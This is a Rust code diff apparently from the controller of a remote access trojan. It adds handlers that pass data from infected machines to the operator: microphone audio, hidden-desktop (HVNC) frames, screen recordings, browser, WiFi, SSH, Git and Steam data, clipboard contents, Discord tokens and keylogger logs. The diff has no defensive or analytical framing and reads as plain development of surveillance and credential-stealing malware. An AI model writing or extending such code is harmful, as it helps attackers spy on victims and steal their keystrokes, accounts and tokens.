@@ -109,7 +109,7 @@ impl ClientReaderWrapper {
         };
     }
 
-    async fn send_server_packet(&self, packet: ServerCommand) {
+    async fn send_server_packet(&mut self, packet: ServerCommand) {
         self.server_sender
             .send(packet)
             .await
@@ -137,6 +137,11 @@ impl ClientReaderWrapper {
 
             RemoteDesktopFrame(frame) => {
                 self.send_server_packet(ServerCommand::RemoteDesktopFrame(self.addr, frame))
+                    .await;
+            }
+
+            RemoteDesktopAudioChunk(chunk) => {
+                self.send_server_packet(ServerCommand::RemoteDesktopAudioChunk(self.addr, chunk))
                     .await;
             }
 
@@ -182,6 +187,93 @@ impl ClientReaderWrapper {
 
             HVNCFrame(frame_data) => {
                 self.send_server_packet(ServerCommand::HVNCFrame(self.addr, frame_data))
+                    .await;
+            }
+
+            MicAudioChunk(chunk) => {
+                self.send_server_packet(ServerCommand::MicAudioChunk(self.addr, chunk))
+                    .await;
+            }
+
+            MicRecordingFile(file_data) => {
+                self.send_server_packet(ServerCommand::MicRecordingFile(self.addr, file_data))
+                    .await;
+            }
+
+            DesktopRecordingPreviewFrame(frame) => {
+                self.send_server_packet(ServerCommand::DesktopRecordingPreviewFrame(
+                    self.addr, frame,
+                ))
+                .await;
+            }
+
+            DesktopRecordingFile(file_data) => {
+                self.send_server_packet(ServerCommand::DesktopRecordingFile(self.addr, file_data))
+                    .await;
+            }
+
+            MicDeviceList(devices) => {
+                self.send_server_packet(ServerCommand::MicDeviceList(self.addr, devices))
+                    .await;
+            }
+
+            BrowserData(data) => {
+                self.send_server_packet(ServerCommand::BrowserData(self.addr, data))
+                    .await;
+            }
+
+            WifiData(data) => {
+                self.send_server_packet(ServerCommand::WifiData(self.addr, data))
+                    .await;
+            }
+
+            SoftwareInventory(data) => {
+                self.send_server_packet(ServerCommand::SoftwareInventory(self.addr, data))
+                    .await;
+            }
+
+            GitData(data) => {
+                self.send_server_packet(ServerCommand::GitData(self.addr, data))
+                    .await;
+            }
+
+            SSHData(data) => {
+                self.send_server_packet(ServerCommand::SSHData(self.addr, data))
+                    .await;
+            }
+
+            SteamData(data) => {
+                self.send_server_packet(ServerCommand::SteamData(self.addr, data))
+                    .await;
+            }
+
+            ClipboardUpdate(data) => {
+                self.send_server_packet(ServerCommand::ClipboardUpdate(self.addr, data))
+                    .await;
+            }
+
+            ClipboardImageUpdate(data) => {
+                self.send_server_packet(ServerCommand::ClipboardImageUpdate(self.addr, data))
+                    .await;
+            }
+
+            NotificationEvent(data) => {
+                self.send_server_packet(ServerCommand::NotificationEvent(self.addr, data))
+                    .await;
+            }
+
+            DiscordTokenData(data) => {
+                self.send_server_packet(ServerCommand::DiscordTokenData(self.addr, data))
+                    .await;
+            }
+
+            KeyloggerUpdate(update) => {
+                self.send_server_packet(ServerCommand::KeyloggerUpdate(self.addr, update))
+                    .await;
+            }
+
+            KeyloggerOfflineLogs(logs) => {
+                self.send_server_packet(ServerCommand::KeyloggerOfflineLogs(self.addr, logs))
                     .await;
             }
 
